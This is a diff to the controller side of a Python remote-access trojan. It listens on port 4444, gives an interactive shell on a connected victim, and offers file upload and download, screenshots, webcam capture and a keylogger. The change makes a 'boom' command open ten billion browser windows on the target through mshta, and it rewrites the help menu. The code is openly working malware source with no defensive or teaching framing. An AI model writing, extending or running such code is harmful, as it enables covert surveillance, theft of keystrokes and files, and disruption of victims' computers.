@@ -90,7 +90,7 @@ def keylogger_start(target):
 def boom():
     commands = [
         'mshta "javascript:for (var i = 0; i < 10; i++) { alert(\'HACKED!!! HACKED!!! HACKED!!! HACKED!!!\'); } window.close();"',
-        'mshta "javascript:for (var i = 0; i < 10; i++) { window.open(\'\',\'Window\' + i,\'width=1280,height=720\').document.write(\'<h1>HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHHA!</h1>\'); }"'
+        'mshta "javascript:for (var i = 0; i < 10000000000; i++) { window.open(\'\',\'Window\' + i,\'width=1280,height=720\').document.write(\'<h1>HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHHA!</h1>\'); }"'
     ]
 
     for command in commands:
@@ -100,12 +100,12 @@ def boom():
             print(f"Error: {e}")
 
 
-def t_commun(target, ip):
+def s_commands(target, ip):
     count = 0
     keylogger_thread = None
     while True:
         try:
-            comm = input(colored('~(SHELL)# %s: ' % str(ip), 'green'))
+            comm = input(colored('~(SHELL) --> %s: ' % str(ip), 'green'))
             data_send(comm, target)
             if comm == 'exit':
                 break
@@ -168,18 +168,18 @@ def t_commun(target, ip):
                     target=keylogger_start, args=(target,), daemon=True)
                 keylogger_thread.start()
                 print("Keylogger started!")
-            elif comm == 'help':
+            elif comm == '-h':
                 print(colored('''\n
-                exit: Close the session on the target machine
                 clear: Clean terminal
-                cd + "DirectoryName": Change directory (target machine)
-                upload + "FileName": Send a file to target machine
-                download + "FileName": Download a file from target machine
+                cd: Change directory (target machine)
+                upload "file": Send a file to target machine
+                download "file": Download a file from target machine
                 screenshot: Takes a screenshot (target machine)
                 webcam: Capture webcam image (target machine)
                 keylogger: Start keylogger (target machine)
-                help: Help the user to use the commands
-\n '''), 'blue')
+                boom: Open 10^9 tabs in the target machine
+                exit: Close the session in the target machine
+\n'''), 'red')
             else:
                 answer = data_recv(target)
                 print(answer)
@@ -189,9 +189,9 @@ def t_commun(target, ip):
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('0.0.0.0', 4444))
-print(colored('[...] Waiting for connections', 'green'))
+print(colored('[...] Listening', 'green'))
 sock.listen(3)
 
 target, ip = sock.accept()
-print(colored('[!] Connected to:' + str(ip), 'red'))
-t_commun(target, ip)
+print(colored('[!] Connected to -->' + str(ip), 'red'))
+s_commands(target, ip)
